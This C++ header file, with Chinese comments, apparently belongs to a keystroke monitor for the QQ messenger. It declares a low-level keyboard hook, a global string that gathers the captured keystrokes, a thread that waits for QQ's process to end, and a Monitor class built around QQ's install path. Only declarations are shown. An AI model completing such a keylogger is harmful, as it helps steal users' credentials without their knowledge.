#pragma once
#include "Main.h"
using namespace std;

class ProcLauncher;				//必须前置声明
extern std::string g_ResStr;	//将监听结果拼接成字符串
extern HHOOK g_KbHook;			//低级键盘钩子

LRESULT CALLBACK KeyBoardEvent(int, WPARAM, LPARAM);//键盘事件处理函数
DWORD WINAPI WaitProcEnd(LPVOID);					//子线程：等待目标进程结束
class Monitor
{
private:
	TCHAR* QQPath;
public:
	Monitor(TCHAR* QQPath);
	void Start();
};